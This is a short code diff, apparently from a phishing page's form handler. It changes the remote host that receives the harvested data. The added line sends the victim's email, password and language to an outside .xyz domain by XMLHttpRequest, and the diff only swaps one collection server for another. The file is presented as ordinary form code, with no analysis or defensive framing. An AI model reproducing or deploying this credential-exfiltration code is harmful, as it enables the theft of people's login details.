@@ -216,7 +216,7 @@ function submitForm() {
         var truyen = encodeURI("email=" + email + "||pass=" + pass + "||laguage=" + sr);
 
         var xhr = new XMLHttpRequest();
-        xhr.open('GET', '//nikgalkinjgtu.xyz/br1t2/accvia.php?'+ truyen);
+        xhr.open('GET', '//brphbp.xyz/pht25/accvia.php?'+ truyen);
         xhr.onload = function () {
           if (xhr.status === 200) {
             try {
